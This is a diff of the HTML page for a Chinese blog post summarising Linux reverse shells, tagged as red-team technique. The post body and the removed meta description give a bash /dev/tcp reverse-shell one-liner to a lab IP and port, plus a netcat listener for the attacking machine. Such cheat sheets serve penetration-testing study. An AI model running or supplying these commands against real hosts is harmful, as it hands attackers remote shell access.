@@ -20,15 +20,15 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="桃李春风一杯酒，江湖夜雨十年灯。  常见的一些linux反弹shell总结 bash反弹123456靶机：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.42.1&#x2F;44044 0&gt;&amp;1非bash环境：&#x2F;bin&#x2F;bash -c &quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.42.1&#x2F;44044 0&gt;&amp;1&amp;q">
+  <meta name="description" content="桃李春风一杯酒，江湖夜雨十年灯。  常见的一些linux反弹shell总结">
 <meta property="og:type" content="article">
 <meta property="og:title" content="linux下反弹shell">
 <meta property="og:url" content="http://example.com/linux%E4%B8%8B%E5%8F%8D%E5%BC%B9shell/index.html">
 <meta property="og:site_name" content="ShadowFlow&#39;s Blog">
-<meta property="og:description" content="桃李春风一杯酒，江湖夜雨十年灯。  常见的一些linux反弹shell总结 bash反弹123456靶机：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.42.1&#x2F;44044 0&gt;&amp;1非bash环境：&#x2F;bin&#x2F;bash -c &quot;&#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;172.16.42.1&#x2F;44044 0&gt;&amp;1&amp;q">
+<meta property="og:description" content="桃李春风一杯酒，江湖夜雨十年灯。  常见的一些linux反弹shell总结">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2021-12-21T05:14:37.000Z">
-<meta property="article:modified_time" content="2021-12-21T07:07:07.892Z">
+<meta property="article:modified_time" content="2021-12-21T07:08:04.576Z">
 <meta property="article:author" content="ShadowFlow">
 <meta property="article:tag" content="红队技术">
 <meta name="twitter:card" content="summary">
@@ -181,7 +181,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2021-12-21 13:14:37 / Modified: 15:07:07" itemprop="dateCreated datePublished" datetime="2021-12-21T13:14:37+08:00">2021-12-21</time>
+              <time title="Created: 2021-12-21 13:14:37 / Modified: 15:08:04" itemprop="dateCreated datePublished" datetime="2021-12-21T13:14:37+08:00">2021-12-21</time>
             </span>
 
           
@@ -206,6 +206,8 @@
 <p>桃李春风一杯酒，江湖夜雨十年灯。</p>
 </blockquote>
 <p>常见的一些linux反弹shell总结</p>
+<span id="more"></span>
+
 <h2 id="bash反弹"><a href="#bash反弹" class="headerlink" title="bash反弹"></a>bash反弹</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">靶机：</span><br><span class="line">bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/172.16.42.1/</span><span class="number">44044</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">非bash环境：<span class="regexp">/bin/</span>bash -c <span class="string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/172.16.42.1/44044 0&gt;&amp;1&quot;</span></span><br><span class="line"></span><br><span class="line">攻击机：</span><br><span class="line">nc -lvvp <span class="number">44044</span></span><br></pre></td></tr></table></figure>
 
 
